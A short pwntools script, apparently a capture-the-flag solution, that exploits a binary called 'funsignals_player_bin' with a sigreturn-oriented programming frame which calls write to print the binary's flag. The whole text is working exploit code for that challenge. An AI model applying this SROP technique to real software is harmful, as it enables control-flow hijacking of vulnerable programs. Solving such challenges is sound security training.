from pwn import *


context.update(arch="amd64", kernel="amd64")

p = process("./funsignals_player_bin")
e = ELF("funsignals_player_bin")

frame = SigreturnFrame()
frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = e.symbols['flag']
frame.rdx = 45 #len(message)
frame.rsp = 0xdeadbeef
frame.rip = e.symbols['syscall']

p.send(bytes(frame))
p.interactive()